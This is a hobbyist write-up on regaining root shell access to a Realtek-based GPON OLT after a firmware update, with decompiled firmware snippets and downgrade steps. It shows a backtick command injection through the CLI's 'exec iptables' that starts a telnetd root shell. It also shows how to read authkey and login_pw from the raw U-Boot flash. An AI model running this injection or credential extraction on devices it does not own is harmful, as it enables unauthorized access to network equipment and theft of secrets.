
# Bonus content!

## OLT Jailbreak
After flashing my cheap OLT to FW 1.0.4 the funny "start-shell" command seems to have stopped working.

This made me quite unhappy, so a fix was needed.

Didn't take long to find the following:

```
gpon-olt# enable
gpon-olt(config)# configure
gpon-olt(config)# exec iptables ;
The format of filename is invalid! It can't contain &|;%"
# Clearly there is some filters missing :)
# So lets try
gpon-olt(config)# exec iptables `telnetd -p 2323 -l /bin/sh`
The number of the whole command can not exceed 5!
# Hmm, only 5 arguments, but no problem for trying telnetd
# But i think real iptables would strugle
gpon-olt(config)# exec iptables `telnetd -p2323 -l/bin/sh`
# No output, but lets see...
gpon-olt(config)# exit
gpon-olt# telnet 127.0.0.1 2323

Entering character mode
Escape character is '^]'.


# 

```

You can now get back shell access and read the top secret keys from U-Boot env.

Normaly Realtek based devices use the `nv` command to manipulate variables but someone was trying to be funny and censored `authkey` and `login_pw`.

Thankfully U-Boot stores its env in plaintext so running `cat /dev/mtd1` will give you what you want :)

After reading `login_pw` start-shell starts to work fine aswell.

It is beyond stupid to lock the user out from accessing linux shell just because they upgraded from firmware version that came from the factory.

## Factory
```
bool check_running_mode()
{
  FILE *v0; // x0
  FILE *v1; // x19
  char s[8]; // [xsp+28h] [xbp+28h] BYREF

  v0 = fopen("/mnt/custfs/device_mode", "r");
  if ( v0 )
  {
    v1 = v0;
    while ( fgets(s, 20, v1) && !s[0] )
      ;
    fclose(v1);
  }
  return *(_QWORD *)s == 0x79726F74636166LL; // "factory"
}
```

## Downgrade (at your own risk)
MTD dump is provided, follow same process as ONT

In case you upgraded from 1.0.3 to 1.0.4 you don't need to do any flashing since this device has dualboot.
```
# nv getenv sw_commit
0
# nv setenv sw_commit 1
# reboot
```
TODO: Upgrade tar has some extra data appended to squashfs

TODO: Is there secure boot?

## Why only 5 args?

```
The number of the whole command can not exceed 5!
# This message seems to imply there is a reason for limiting executing commands to 5 arguments
# And there is, just a verry stupid one...

__int64 __fastcall sub_439460(const char *a1, int a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  int v12; // w0
  __WAIT_STATUS v13; // x1
  __int64 result; // x0
  FILE *v15; // x19
  int *v16; // x0
  const char *v17; // x0
  FILE *v18; // x20
  int *v19; // x0
  const char *v20; // x0
  char v21; // [xsp+4Ch] [xbp+4Ch] BYREF

  v12 = fork();
  if ( v12 < 0 )
  {
    v15 = stderr;
    v16 = __errno_location();
    v17 = (const char *)safe_strerror((unsigned int)*v16);
    fprintf(v15, "Can't fork: %s\n", v17);
    exit(1);
  }
  if ( !v12 )
  {
    switch ( a2 )
    {
      case 3:
        execlp(a1, a1, a3, a4, a5, 0LL);
        break;
      case 4:
        execlp(a1, a1, a3, a4, a5, a6, 0LL);
        break;
      case 1:
        execlp(a1, a1, a3, 0LL);
        break;
      case 2:
        execlp(a1, a1, a3, a4, 0LL);
        break;
      default:
        execlp(a1, a1, 0LL);
        break;
    }
    v18 = stderr;
    v19 = __errno_location();
    v20 = (const char *)safe_strerror((unsigned int)*v19);
    fprintf(v18, "Can't execute %s: %s\n", a1, v20);
    exit(1);
  }
  v13.__uptr = (union wait *)&v21;
  execute_flag = 1;
  result = wait4(v12, v13, 0, 0LL);
  execute_flag = 0;
  return result;
}

# I must say it is impressive to design your CLI system to never execute system commands with more then 5 arguments
```

